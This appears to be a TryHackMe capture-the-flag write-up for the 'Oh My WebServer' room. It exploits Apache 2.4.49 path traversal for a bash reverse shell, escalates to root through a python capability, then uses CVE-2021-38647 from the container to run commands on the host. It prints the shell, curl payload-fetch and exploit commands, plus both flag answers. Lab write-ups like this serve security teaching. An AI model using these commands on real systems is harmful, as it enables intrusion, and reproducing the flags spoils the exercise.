![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d5b0f38f-557a-4e16-8f85-3fe19e513ec8)# [Oh My WebServer](https://tryhackme.com/room/ohmyweb)

> Can you root me?

## Scanning

scan the target

```
nmap -A -T4 10.10.178.132
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5f4decf1-372d-4c0c-bbca-9648f7b4e585)

## HTTP

check the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/715ecf83-e9db-437e-bc0e-d23a73f82eb3)

## Enumeration

scan the directory

```
gobuster dir -u http://10.10.178.132/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ff5db961-7d32-40b1-b4c3-0bca9668cf70)

we have an assets for all file in here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d778b509-88ad-4220-a05c-05961e2231ac)

and cgi-bin can use for access any assets

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/41170e8e-064f-4468-99ba-9884f4b9c911)

## Exploitation

let's find some exploit

```
searchsploit apache 2.4.49
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cc44119e-061a-4240-8407-6ec615bdfbc9)

```
searchsploit -m 50383.sh
echo http://10.10.178.132 > target.txt
```

and you can use like that

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ecdf8d1d-2952-4d28-a4f5-84e180e94718)

do a reverse shell

```
./50383.sh target.txt /bin/bash "bash -i >& /dev/tcp/10.18.37.45/4444 0>&1"
```

```
nc -vlnp 4444
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d8ac4be3-ca75-4dde-8bff-f220e00740ae)

it's seem we are in docker container

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a6e4bc20-eadb-4dc0-b05b-791c5ab95de3)

and there is no flag inside docker, check for capibilities

```
getcap -r / 2>/dev/null
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f758deb0-7c70-49c4-af0e-0cd8632f3647)

leverage it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e88ee2b9-9d4c-4b2f-96b9-f0284c4d3b9a)

```
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e66a2595-9be3-486e-beaa-0eabbba4b43d)

our flag is on root folder of the container

| Flag | user.txt |
| --- | --- |
| Answer | THM{eacffefe1d2aafcc15e70dc2f07f7ac1} |

## Privilege Escalation

now, we need to escalation to real machine, not docker

guess that the host is 172.17.0.1, since we are on 172.17.0.2

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b3d458ee-7f26-4594-844c-f7632f32c12a)

now, it need the support of nmap

on attacker machine

```
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
python3 -m http.server
```

on target machine

```
curl http://10.18.37.45:8000/nmap -o nmap
chmod 777 nmap
```

now we can use nmap

```
./nmap 172.17.0.1 -p- --min-rate 5000
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up (0.00042s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
```

search for port 5986 service exploit, i found CVE-2021-38647

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/99dd1892-a1a2-440e-9038-4bf183a1604d)

clone to attacker machine

```
git clone https://github.com/AlteredSecurity/CVE-2021-38647
cd CVE-2021-38647
python3 -m http.server
```

on target machine

```
curl http://10.18.37.45:8000/CVE-2021-38647.py -o CVE-2021-38647.py
curl http://10.18.37.45:8000/Invoke-CVE-2021-38647.ps1 -o Invoke-CVE-2021-38647.ps1
```

now, exploit as following

```
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'id'
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'hostname'
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'uname -a'
```

we have exploited on actual machine

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d6beda09-7ad8-4fdd-9163-371d24b3845a)

```
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'cat /root/root.txt'
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7ed9cce8-4983-4a05-ae5f-ab6ab8c310e0)

| Flag | root.txt |
| --- | --- |
| Answer | THM{7f147ef1f36da9ae29529890a1b6011f} |
